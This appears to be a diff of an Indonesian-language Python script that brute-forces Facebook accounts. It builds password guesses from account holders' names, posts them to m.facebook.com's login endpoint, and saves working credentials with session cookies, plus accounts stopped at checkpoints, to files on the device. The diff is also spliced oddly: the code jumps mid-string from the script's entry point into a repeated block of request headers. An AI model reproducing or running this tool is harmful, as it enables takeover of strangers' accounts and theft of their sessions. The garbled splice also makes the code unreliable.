@@ -206,6 +206,76 @@ class Zoraa_Dev:
 }}'''.format(userid, passwd, cookies))
                         open(self.ok,'a').write('{}|{}|{}\n'.format(userid,passwd,cookies))
                         break             
+                    if 'com.bloks.www.two_step_verification.async.entrypoint' in str(response2.text.replace('\\', '')):
+                        Console().print('''Checkpoint:{{
+  User ID: {}
+  Password: {}
+}}'''.format(userid, passwd))
+                        self.checkpoint+=1
+                        open(self.cp,'a').write('{}|{}\n'.format(userid,passwd))
+                        break    
+                    else: continue   
+                except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects) as e:
+                    Console().print('[•] Koneksi Error', end='\r')
+                    time.sleep(31)
+                    self.Exec_WbLock(userid, password)
+            self.loop +=1  
+            Console().print(f" • {str(userid)[:15]} {'{:.0%}'.format(self.loop/float(len(dump)))}|{str(len(dump))}|{self.loop} Ok: {self.success}|Cp: {self.checkpoint}", end='\r')
+        
+    def WordList(self, username):
+        self.password = []
+        for nama in username.split(' '):
+            if len(nama) < 3:
+                continue
+            else:
+                for passwords in [f'{nama}123',f'{nama}1234',f'{nama}12345']:
+                    if len(passwords) < 6 or str(passwords).isalnum() == False or len(username.split(' ')) > 6:
+                        continue
+                    else:
+                        self.password.append(f'{str(passwords).lower()}')
+        for passwords in [f'{username}', f'{username.replace(" ", "")}']:
+            if len(passwords) < 6 or str(passwords).replace(' ', '').isalnum() == False:
+                continue
+            else:
+                self.password.append(f'{str(passwords).lower()}')
+        return (self.password)
+
+if __name__ == '__main__':
+    os.system('clear')
+    try: os.mkdir('/sdcard/OK') or os.mkdir('/sdcard/CP')
+    except (Exception) as e: pass
+    Zoraa_Dev().Via_File()Brand\";v=\"99.0.0.0\", \"Google Chrome\";v=\"139.0.7258.62\", \"Chromium\";v=\"139.0.7258.62\"",
+                        "sec-ch-ua-platform": "\"Android\"",
+                        "sec-ch-ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
+                        "sec-ch-ua-model": "\"\"",
+                        "sec-ch-ua-mobile": "?1",
+                        "sec-ch-prefers-color-scheme": "dark",
+                        "user-agent": self.useragents,
+                        "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+                        "sec-ch-ua-platform-version": "\"\"",
+                        "accept": "*/*",
+                        "origin": "https://m.facebook.com",
+                        "sec-fetch-site": "same-origin",
+                        "sec-fetch-mode": "cors",
+                        "sec-fetch-dest": "empty",
+                        "referer": "https://m.facebook.com/login/",
+                        "accept-encoding": "gzip, deflate",
+                        "accept-language": "id-ID,id;q=0.9",
+                        "x-fb-lsd": re.search('"lsd":"(.*?)"',str(response)).group(1),
+                        "cookies": "fr=1BjN72JrkUHC03BgX.AWcvum8whY7ywMHph-2c60eLb_Vwj-1VuWcsUn08fPA23ABH_Uw.BonAS6..AAA.0.0.BonATc.AWdE--N48VhGZab8tu4Vp7wxorY",
+                        "priority": "u=1, i"
+                    }
+                    response2 = byps.post('https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=7dc3df7a1c2b41c2ef275eac1130af6da64453b8e5de853b8cf45b43c64d127b',data = payload, headers = self.post_headers)
+                    if 'c_user' in byps.cookies.get_dict().keys():
+                        self.success+=1
+                        cookies = (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])
+                        Console().print('''Success:{{
+  User ID: {}
+  Password: {}
+  Cookies: {}
+}}'''.format(userid, passwd, cookies))
+                        open(self.ok,'a').write('{}|{}|{}\n'.format(userid,passwd,cookies))
+                        break             
                     if 'checkpoint' in byps.cookies.get_dict().keys():
                         Console().print('''Checkpoint:{{
   User ID: {}
